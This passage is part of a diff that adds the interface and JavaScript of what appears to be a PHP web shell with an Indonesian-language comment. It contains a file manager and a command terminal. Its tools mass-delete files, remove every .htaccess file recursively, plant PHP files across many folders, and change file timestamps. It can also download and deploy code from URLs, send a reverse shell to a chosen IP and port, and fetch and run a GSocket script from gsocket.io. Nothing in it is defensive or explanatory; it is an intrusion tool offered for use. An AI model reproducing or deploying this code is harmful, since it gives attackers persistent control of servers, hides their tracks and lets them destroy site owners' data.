+                                $ownerGroup = $ownerName . ':' . $groupName;
+                                
+                                // Get modified time
+                                $modified = date('Y-m-d H:i:s', filemtime($full));
+                            ?>
+                            <tr>
+                                <td><input type="checkbox" class="file-checkbox" name="<?php echo $isDir ? 'dir_targets[]' : 'file_targets[]'; ?>" value="<?php echo htmlspecialchars($full); ?>"></a>
+                                <td>
+                                    <?php if($isDir): ?>
+                                        <a href="?pwd=<?php echo urlencode($full); ?>" class="folder-link"><i class="fas fa-folder"></i> <?php echo htmlspecialchars($name); ?>/</a>
+                                    <?php else: ?>
+                                        <i class="fas fa-file"></i> <?php echo htmlspecialchars($name); ?>
+                                    <?php endif; ?>
+                                </a>
+                                <td><?php echo $size; ?></a>
+                                <td><?php echo $perm; ?></a>
+                                <td><?php echo htmlspecialchars($ownerGroup); ?></a>
+                                <td><?php echo $modified; ?></a>
+                                <td>
+                                    <?php if(!$isDir): ?>
+                                        <button type="button" class="btn" onclick="editFile('<?php echo urlencode($name); ?>')">
+                                            <i class="fas fa-edit"></i> Edit
+                                        </button>
+                                    <?php else: ?>
+                                        <span class="badge">folder</span>
+                                    <?php endif; ?>
+                                </a>
+                            </tr>
+                            <?php endforeach; ?>
+                        </tbody>
+                    </table>
+                </form>
+                
+                <hr>
+                
+                <!-- ACTION BUTTONS -->
+                <div class="flex-between">
+                    <div class="flex">
+                        <button type="button" class="btn btn-danger" onclick="deleteSelected()"><i class="fas fa-trash"></i> Mass Delete</button>
+                        <button type="button" class="btn btn-danger" onclick="deleteHtaccessAll()"><i class="fas fa-ban"></i> Delete .htaccess</button>
+                        <button type="button" class="btn" onclick="zipSelected()"><i class="fas fa-file-archive"></i> ZIP Selected</button>
+                    </div>
+                    <div class="flex">
+                        <button type="button" class="btn" onclick="openToolsModal()"><i class="fas fa-tools"></i> Tools</button>
+                        <button type="button" class="btn" onclick="openUltimateModal()"><i class="fas fa-skull"></i> Ultimate</button>
+                    </div>
+                </div>
+                
+                <?php if (!empty($messages)): ?>
+                <div style="margin-top: 20px; padding: 12px; background: var(--input-bg); border-radius: 12px;">
+                    <?php foreach ($messages as $msg): ?>
+                        <div style="font-size: 13px; padding: 4px 0;"><?php echo htmlspecialchars($msg); ?></div>
+                    <?php endforeach; ?>
+                </div>
+                <?php endif; ?>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL CREATE FILE OPTIONS (Single / Recursive) -->
+    <div id="createFileModal" class="modal">
+        <div class="modal-content modal-small">
+            <div class="modal-header">
+                <div class="modal-title"><i class="fas fa-file"></i> Create File: <span id="createFileName"></span></div>
+                <span class="close-modal" onclick="closeModal('createFileModal')">&times;</span>
+            </div>
+            <div style="margin-bottom: 20px;">
+                <p style="margin-bottom: 16px;">Choose how to create <strong id="confirmFileName"></strong></p>
+                <div class="flex" style="justify-content: center; gap: 20px;">
+                    <button class="btn btn-primary" onclick="createFileSingle()" style="padding: 12px 24px; font-size: 16px;">
+                        <i class="fas fa-file"></i> Single File
+                    </button>
+                    <button class="btn btn-primary" onclick="createFileRecursive()" style="padding: 12px 24px; font-size: 16px;">
+                        <i class="fas fa-folder-open"></i> Recursive
+                    </button>
+                </div>
+                <div style="margin-top: 16px; font-size: 12px; color: var(--text-dim); text-align: center;">
+                    <strong>Single:</strong> Create file only in current folder<br>
+                    <strong>Recursive:</strong> Create file in ALL selected folders (check folders in table above)
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL CREATE FILE RECURSIVE (dengan editor) -->
+    <div id="recursiveEditorModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title"><i class="fas fa-edit"></i> Create File Recursive: <span id="recursiveFileName"></span></div>
+                <span class="close-modal" onclick="closeModal('recursiveEditorModal')">&times;</span>
+            </div>
+            <textarea id="recursiveFileContent" class="code-editor" rows="15" placeholder="&lt;?php&#10;// Write your code here&#10;?&gt;"></textarea>
+            <div class="flex" style="margin-top: 20px; justify-content: flex-end;">
+                <button class="btn" onclick="closeModal('recursiveEditorModal')">Cancel</button>
+                <button class="btn btn-primary" onclick="submitRecursiveCreate()">Create Recursive</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL TERMINAL -->
+    <div id="terminalModal" class="modal">
+        <div class="modal-content" style="max-width: 800px;">
+            <div class="modal-header">
+                <div class="modal-title"><i class="fas fa-terminal"></i> Terminal</div>
+                <span class="close-modal" onclick="closeModal('terminalModal')">&times;</span>
+            </div>
+            <div id="terminalOutput" class="terminal-output">$ Type command below...</div>
+            <div class="flex" style="margin-top: 16px;">
+                <input type="text" id="terminalCommand" placeholder="$ command" style="flex: 1;" onkeypress="if(event.key==='Enter') runCommand()">
+                <button class="btn btn-primary" onclick="runCommand()">Run</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL EDITOR -->
+    <div id="editorModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title"><i class="fas fa-edit"></i> <span id="modalFileName">Edit File</span></div>
+                <span class="close-modal" onclick="closeModal('editorModal')">&times;</span>
+            </div>
+            <textarea id="fileContent" class="code-editor" rows="20"></textarea>
+            <div class="flex" style="margin-top: 20px; justify-content: flex-end;">
+                <button class="btn" onclick="closeModal('editorModal')">Cancel</button>
+                <button class="btn btn-primary" onclick="saveFile()">Save Changes</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL TOOLS -->
+    <div id="toolsModal" class="modal">
+        <div class="modal-content modal-small">
+            <div class="modal-header">
+                <div class="modal-title"><i class="fas fa-tools"></i> Tools</div>
+                <span class="close-modal" onclick="closeModal('toolsModal')">&times;</span>
+            </div>
+            
+            <div class="card-title" style="font-size: 14px; margin-bottom: 8px;">🔐 Chmod</div>
+            <div class="flex" style="margin-bottom: 16px;">
+                <input type="text" id="chmodMode" placeholder="0755" value="0755" style="width: 80px;">
+                <button class="btn btn-primary" onclick="applyChmod()">Apply to Selected</button>
+            </div>
+            
+            <hr>
+            
+            <div class="card-title" style="font-size: 14px; margin-bottom: 8px;">⏰ Modify Time</div>
+            <div class="flex" style="margin-bottom: 16px;">
+                <input type="text" id="modifyTime" placeholder="2025-01-15 14:30:00" style="flex:1;">
+                <button class="btn btn-primary" onclick="applyModifyTime()">Apply</button>
+            </div>
+            
+            <hr>
+            
+            <div class="card-title" style="font-size: 14px; margin-bottom: 8px;">📦 Preset URL</div>
+            <div class="flex" style="flex-wrap: wrap; margin-bottom: 8px;">
+                <?php foreach ($presets as $key => $url): ?>
+                    <button class="btn" onclick="setPresetUrl('<?php echo htmlspecialchars($url); ?>')"><?php echo htmlspecialchars($key); ?></button>
+                <?php endforeach; ?>
+            </div>
+            <div class="flex">
+                <input type="text" id="presetUrl" placeholder="URL" style="flex:2;">
+                <input type="text" id="presetTarget" placeholder="filename" style="flex:1;">
+                <button class="btn btn-primary" onclick="deployPreset()">Deploy</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL ULTIMATE -->
+    <div id="ultimateModal" class="modal">
+        <div class="modal-content modal-small">
+            <div class="modal-header">
+                <div class="modal-title"><i class="fas fa-skull"></i> Ultimate</div>
+                <span class="close-modal" onclick="closeModal('ultimateModal')">&times;</span>
+            </div>
+            
+            <div class="card-title" style="font-size: 14px; margin-bottom: 8px;">🗄️ Adminer</div>
+            <div class="flex" style="margin-bottom: 16px; flex-wrap: wrap;">
+                <input type="text" id="adminerHost" placeholder="Host" value="localhost" style="flex:1;">
+                <input type="text" id="adminerUser" placeholder="Username" value="root" style="flex:1;">
+                <input type="password" id="adminerPass" placeholder="Password" style="flex:1;">
+                <input type="text" id="adminerDb" placeholder="Database" style="flex:1;">
+            </div>
+            <button class="btn btn-primary" style="width:100%; margin-bottom: 16px;" onclick="openAdminer()">
+                <i class="fas fa-database"></i> Open Adminer
+            </button>
+            
+            <hr>
+            
+            <div class="card-title" style="font-size: 14px; margin-bottom: 8px;">🔄 Reverse Shell</div>
+            <div class="flex" style="margin-bottom: 16px;">
+                <input type="text" id="reverseIp" placeholder="IP Address" style="flex:1;">
+                <input type="text" id="reversePort" placeholder="Port" style="width: 80px;">
+                <button class="btn btn-danger" onclick="startReverseShell()">Start</button>
+            </div>
+            
+            <hr>
+            
+            <div class="card-title" style="font-size: 14px; margin-bottom: 8px;">🌐 GSocket</div>
+            <button class="btn btn-primary" style="width:100%;" onclick="runGSocket()">
+                <i class="fas fa-plug"></i> Run GSocket
+            </button>
+        </div>
+    </div>
+
+    <script>
+    let currentPwd = '<?php echo addslashes($pwd); ?>';
+    let currentEditFile = '';
+    let pendingFileName = '';
+
+    // ========== THEME SWITCHER ==========
+    function setTheme(theme) {
+        document.body.className = theme;
+        fetch('?set_theme=' + theme)
+            .then(() => {
+                showToast('✅ Theme changed to ' + theme);
+            });
+    }
+
+    // ========== TOAST ==========
+    function showToast(message, isError = false) {
+        let toast = document.createElement('div');
+        toast.className = 'toast-notify';
+        toast.style.background = isError ? '#ef4444' : 'var(--accent)';
+        toast.innerHTML = message;
+        document.body.appendChild(toast);
+        setTimeout(() => {
+            if (toast.parentNode) toast.parentNode.removeChild(toast);
+        }, 3000);
+    }
+
+    // ========== COPY ==========
+    async function copyToClipboard(text) {
+        let cleanText = text.replace(/\s+/g, ' ').trim();
+        try {
+            await navigator.clipboard.writeText(cleanText);
+            showToast('✅ Copied: ' + cleanText.substring(0, 60));
+        } catch(err) {
+            let textarea = document.createElement('textarea');
+            textarea.value = cleanText;
+            document.body.appendChild(textarea);
+            textarea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textarea);
+            showToast('✅ Copied: ' + cleanText.substring(0, 60));
+        }
+    }
+
+    // ========== MODAL ==========
+    function openModal(modalId) {
+        document.getElementById(modalId).style.display = 'block';
+    }
+    function closeModal(modalId) {
+        document.getElementById(modalId).style.display = 'none';
+    }
+
+    // ========== CREATE FILE WITH OPTIONS ==========
+    function showCreateFileOptions() {
+        let name = document.getElementById('newFileName').value.trim();
+        if (!name) {
+            showToast('❌ Please enter a filename', true);
+            return;
+        }
+        pendingFileName = name;
+        document.getElementById('createFileName').innerHTML = name;
+        document.getElementById('confirmFileName').innerHTML = name;
+        openModal('createFileModal');
+    }
+
+    function createFileSingle() {
+        closeModal('createFileModal');
+        let name = pendingFileName;
+        
+        fetch('?ajax=create_file&pwd=' + encodeURIComponent(currentPwd), {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: 'name=' + encodeURIComponent(name)
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.success) {
+                showToast('✅ File created: ' + name);
+                document.getElementById('newFileName').value = '';
+                editFile(encodeURIComponent(name));
+            } else {
+                showToast('❌ ' + data.message, true);
+            }
+        });
+    }
+
+    function createFileRecursive() {
+        let selectedFolders = [];
+        document.querySelectorAll('.file-checkbox:checked').forEach(cb => {
+            let val = cb.value;
+            if (val.includes('/') || val.includes('\\')) {
+                selectedFolders.push(val);
+            }
+        });
+        
+        if (selectedFolders.length === 0) {
+            showToast('❌ Please select at least one folder for recursive creation!', true);
+            closeModal('createFileModal');
+            return;
+        }
+        
+        closeModal('createFileModal');
+        let name = pendingFileName;
+        document.getElementById('recursiveFileName').innerHTML = name;
+        document.getElementById('recursiveFileContent').value = "<?php\n// " + name + "\n?>";
+        openModal('recursiveEditorModal');
+    }
+
+    function submitRecursiveCreate() {
+        let name = pendingFileName;
+        let content = document.getElementById('recursiveFileContent').value;
+        let selectedFolders = [];
+        
+        document.querySelectorAll('.file-checkbox:checked').forEach(cb => {
+            let val = cb.value;
+            if (val.includes('/') || val.includes('\\')) {
+                selectedFolders.push(val);
+            }
+        });
+        
+        if (selectedFolders.length === 0) {
+            showToast('❌ No folders selected!', true);
+            closeModal('recursiveEditorModal');
+            return;
+        }
+        
+        let formData = new FormData();
+        formData.append('action', 'create_file_recursive');
+        formData.append('new_file_name_rec', name);
+        formData.append('new_file_content_rec', content);
+        selectedFolders.forEach(folder => {
+            formData.append('dir_targets[]', folder);
+        });
+        
+        fetch('', {
+            method: 'POST',
+            body: formData
+        })
+        .then(() => {
+            showToast('✅ Recursive creation started! Check messages above.');
+            closeModal('recursiveEditorModal');
+            setTimeout(() => location.reload(), 1000);
+        });
+    }
+
+    // ========== CREATE FOLDER ==========
+    function createNewFolder() {
+        let name = document.getElementById('newFolderName').value.trim();
+        if (!name) {
+            showToast('❌ Please enter a folder name', true);
+            return;
+        }
+        
+        fetch('?ajax=create_folder&pwd=' + encodeURIComponent(currentPwd), {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: 'name=' + encodeURIComponent(name)
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.success) {
+                showToast('✅ Folder created: ' + name);
+                document.getElementById('newFolderName').value = '';
+                setTimeout(() => location.reload(), 500);
+            } else {
+                showToast('❌ ' + data.message, true);
+            }
+        });
+    }
+
+    // ========== TERMINAL ==========
+    function openTerminalModal() {
+        document.getElementById('terminalOutput').innerHTML = '$ Ready...';
+        document.getElementById('terminalCommand').value = '';
+        openModal('terminalModal');
+    }
+
+    function runCommand() {
+        let cmd = document.getElementById('terminalCommand').value;
+        if (!cmd) return;
+        
+        let outputDiv = document.getElementById('terminalOutput');
+        outputDiv.innerHTML += '\n$ ' + cmd + '\n⏳ Running...';
+        
+        fetch('?ajax=terminal&pwd=' + encodeURIComponent(currentPwd), {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: 'cmd=' + encodeURIComponent(cmd)
+        })
+        .then(r => r.json())
+        .then(data => {
+            outputDiv.innerHTML = '$ ' + cmd + '\n' + data.output + '\n\n$ ';
+            document.getElementById('terminalCommand').value = '';
+            outputDiv.scrollTop = outputDiv.scrollHeight;
+        })
+        .catch(() => {
+            outputDiv.innerHTML += '\n❌ Error executing command\n\n$ ';
+        });
+    }
+
+    // ========== FILE EDITOR ==========
+    function editFile(filename) {
+        currentEditFile = decodeURIComponent(filename);
+        document.getElementById('modalFileName').innerHTML = 'Editing: ' + currentEditFile;
+        document.getElementById('fileContent').value = 'Loading...';
+        openModal('editorModal');
+        
+        fetch('?ajax=get_file&pwd=' + encodeURIComponent(currentPwd) + '&file=' + filename)
+            .then(r => r.json())
+            .then(data => {
+                if (data.content !== undefined) {
+                    document.getElementById('fileContent').value = data.content;
+                } else {
+                    document.getElementById('fileContent').value = '// Error loading file';
+                }
+            })
+            .catch(() => {
+                document.getElementById('fileContent').value = '// Error loading file';
+            });
+    }
+
+    function saveFile() {
+        let content = document.getElementById('fileContent').value;
+        let formData = new FormData();
+        formData.append('file', currentEditFile);
+        formData.append('content', content);
+        
+        fetch('?ajax=save_file&pwd=' + encodeURIComponent(currentPwd), {
+            method: 'POST',
+            body: formData
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.success) {
+                showToast('✅ File saved successfully!');
+                closeModal('editorModal');
+            } else {
+                showToast('❌ ' + data.message, true);
+            }
+        })
+        .catch(() => {
+            showToast('❌ Error saving file', true);
+        });
+    }
+
+    // ========== DELETE ACTIONS ==========
+    function getSelectedFiles() {
+        let files = [];
+        document.querySelectorAll('.file-checkbox:checked').forEach(cb => {
+            if (cb.value && !cb.value.includes('/') && !cb.value.includes('\\')) {
+                files.push(cb.value);
+            }
+        });
+        return files;
+    }
+
+    function deleteSelected() {
+        let files = getSelectedFiles();
+        if (files.length === 0) {
+            showToast('❌ No files selected', true);
+            return;
+        }
+        if (!confirm('Delete ' + files.length + ' selected item(s)? This cannot be undone!')) return;
+        
+        let form = document.createElement('form');
+        form.method = 'POST';
+        form.action = '?pwd=' + encodeURIComponent(currentPwd);
+        
+        let inputAction = document.createElement('input');
+        inputAction.type = 'hidden';
+        inputAction.name = 'action';
+        inputAction.value = 'mass_delete';
+        form.appendChild(inputAction);
+        
+        files.forEach(file => {
+            let inp = document.createElement('input');
+            inp.type = 'hidden';
+            inp.name = 'file_targets[]';
+            inp.value = file;
+            form.appendChild(inp);
+        });
+        
+        document.querySelectorAll('.file-checkbox:checked').forEach(cb => {
+            let val = cb.value;
+            if (val.includes('/') || val.includes('\\')) {
+                let inp = document.createElement('input');
+                inp.type = 'hidden';
+                inp.name = 'dir_targets[]';
+                inp.value = val;
+                form.appendChild(inp);
+            }
+        });
+        
+        document.body.appendChild(form);
+        form.submit();
+    }
+
+    function deleteHtaccessAll() {
+        if (!confirm('⚠️ WARNING: Delete ALL .htaccess files recursively?')) return;
+        
+        let form = document.createElement('form');
+        form.method = 'POST';
+        form.action = '?pwd=' + encodeURIComponent(currentPwd);
+        
+        let inputAction = document.createElement('input');
+        inputAction.type = 'hidden';
+        inputAction.name = 'action';
+        inputAction.value = 'delete_htaccess_all';
+        form.appendChild(inputAction);
+        
+        document.body.appendChild(form);
+        form.submit();
+    }
+
+    // ========== UPLOAD & DEPLOY ==========
+    function uploadFile() {
+        let fileInput = document.getElementById('uploadFile');
+        let target = document.getElementById('uploadTarget').value.trim();
+        
+        if (!fileInput.files[0]) {
+            showToast('❌ Please select a file', true);
+            return;
+        }
+        if (!target) {
+            showToast('❌ Please enter target filename', true);
+            return;
+        }
+        
+        let formData = new FormData();
+        formData.append('file', fileInput.files[0]);
+        formData.append('target', target);
+        
+        fetch('?ajax=upload_file&pwd=' + encodeURIComponent(currentPwd), {
+            method: 'POST',
+            body: formData
+        })
+        .then(r => r.json())
+        .then(data => {
+            showToast(data.message);
+            if (data.success) setTimeout(() => location.reload(), 500);
+        });
+    }
+
+    function deployUrl() {
+        let url = document.getElementById('deployUrl').value.trim();
+        let target = document.getElementById('deployTarget').value.trim();
+        
+        if (!url || !target) {
+            showToast('❌ URL and target filename required', true);
+            return;
+        }
+        
+        let formData = new FormData();
+        formData.append('url', url);
+        formData.append('target', target);
+        
+        fetch('?ajax=deploy_url&pwd=' + encodeURIComponent(currentPwd), {
+            method: 'POST',
+            body: formData
+        })
+        .then(r => r.json())
+        .then(data => {
+            showToast(data.message);
+            if (data.success) setTimeout(() => location.reload(), 500);
+        });
+    }
+
+    function deployPreset() {
+        let url = document.getElementById('presetUrl').value.trim();
+        let target = document.getElementById('presetTarget').value.trim();
+        
+        if (!url || !target) {
+            showToast('❌ URL and target filename required', true);
+            return;
+        }
+        
+        let formData = new FormData();
+        formData.append('url', url);
+        formData.append('target', target);
+        
+        fetch('?ajax=deploy_url&pwd=' + encodeURIComponent(currentPwd), {
+            method: 'POST',
+            body: formData
+        })
+        .then(r => r.json())
+        .then(data => {
+            showToast(data.message);
+            if (data.success) setTimeout(() => location.reload(), 500);
+        });
+        closeModal('toolsModal');
+    }
+
+    function setPresetUrl(url) {
+        document.getElementById('presetUrl').value = url;
+        document.getElementById('presetTarget').focus();
+    }
+
+    // ========== ZIP ==========
+    function zipSelected() {
+        let files = getSelectedFiles();
+        if (files.length === 0) {
+            showToast('❌ No files selected', true);
+            return;
+        }
+        
+        let form = document.createElement('form');
+        form.method = 'POST';
+        form.action = '?pwd=' + encodeURIComponent(currentPwd);
+        
+        let inputAction = document.createElement('input');
+        inputAction.type = 'hidden';
+        inputAction.name = 'action';
+        inputAction.value = 'zip_selected';
+        form.appendChild(inputAction);
+        
+        files.forEach(file => {
+            let inp = document.createElement('input');
+            inp.type = 'hidden';
+            inp.name = 'file_targets[]';
+            inp.value = file;
+            form.appendChild(inp);
+        });
+        
+        document.querySelectorAll('.file-checkbox:checked').forEach(cb => {
+            let val = cb.value;
+            if (val.includes('/') || val.includes('\\')) {
+                let inp = document.createElement('input');
+                inp.type = 'hidden';
+                inp.name = 'dir_targets[]';
+                inp.value = val;
+                form.appendChild(inp);
+            }
+        });
+        
+        document.body.appendChild(form);
+        form.submit();
+    }
+
+    // ========== TOOLS ==========
+    function openToolsModal() {
+        openModal('toolsModal');
+    }
+
+    function applyChmod() {
+        let files = getSelectedFiles();
+        let mode = document.getElementById('chmodMode').value.trim();
+        if (files.length === 0) {
+            showToast('❌ No files selected', true);
+            return;
+        }
+        if (!mode) mode = '0755';
+        
+        let formData = new FormData();
+        formData.append('mode', mode);
+        formData.append('files', JSON.stringify(files));
+        
+        fetch('?ajax=chmod&pwd=' + encodeURIComponent(currentPwd), {
+            method: 'POST',
+            body: formData
+        })
+        .then(r => r.json())
+        .then(data => {
+            showToast(data.message);
+            if (data.success) setTimeout(() => location.reload(), 500);
+        });
+    }
+
+    function applyModifyTime() {
+        let files = getSelectedFiles();
+        let time = document.getElementById('modifyTime').value.trim();
+        if (files.length === 0) {
+            showToast('❌ No files selected', true);
+            return;
+        }
+        if (!time) {
+            showToast('❌ Please enter time (YYYY-MM-DD HH:MM:SS)', true);
+            return;
+        }
+        
+        let formData = new FormData();
+        formData.append('time', time);
+        formData.append('files', JSON.stringify(files));
+        
+        fetch('?ajax=modify_time&pwd=' + encodeURIComponent(currentPwd), {
+            method: 'POST',
+            body: formData
+        })
+        .then(r => r.json())
+        .then(data => {
+            showToast(data.message);
+        });
+    }
+
+    // ========== ULTIMATE ==========
+    function openUltimateModal() {
+        openModal('ultimateModal');
+    }
+
+    function openAdminer() {
+        let host = document.getElementById('adminerHost').value;
+        let user = document.getElementById('adminerUser').value;
+        let pass = document.getElementById('adminerPass').value;
+        let db = document.getElementById('adminerDb').value;
+        
+        let url = 'https://www.adminer.org/static/iframe.php?username=' + encodeURIComponent(user) + '&db=' + encodeURIComponent(db) + '&host=' + encodeURIComponent(host);
+        if (pass) url += '&password=' + encodeURIComponent(pass);
+        
+        window.open(url, '_blank');
+        showToast('🗄️ Adminer opened in new tab');
+    }
+
+    function startReverseShell() {
+        let ip = document.getElementById('reverseIp').value.trim();
+        let port = document.getElementById('reversePort').value.trim();
+        
+        if (!ip || !port) {
+            showToast('❌ IP and Port required', true);
+            return;
+        }
+        if (!confirm('⚠️ Send reverse shell to ' + ip + ':' + port + '?')) return;
+        
+        let formData = new FormData();
+        formData.append('ip', ip);
+        formData.append('port', port);
+        
+        fetch('?ajax=reverse_shell&pwd=' + encodeURIComponent(currentPwd), {
+            method: 'POST',
+            body: formData
+        })
+        .then(r => r.json())
+        .then(data => {
+            showToast(data.message);
+        });
+    }
+
+    function runGSocket() {
+        if (!confirm('Run GSocket? This will download and execute script from gsocket.io')) return;
+        
+        fetch('?ajax=gsocket&pwd=' + encodeURIComponent(currentPwd))
+            .then(r => r.json())
+            .then(data => {
+                showToast(data.message);
+                if (data.output) console.log(data.output);
+            });
+    }
+
+    // ========== SELECT ALL ==========
+    document.getElementById('selectAll')?.addEventListener('change', function(e) {
+        document.querySelectorAll('.file-checkbox').forEach(cb => cb.checked = e.target.checked);
+    });
+
+    // ========== CLICK OUTSIDE MODAL ==========
+    window.onclick = function(event) {
+        if (event.target.classList.contains('modal')) {
+            event.target.style.display = 'none';
+        }
+    }
+    </script>
+    </body>
+    </html>
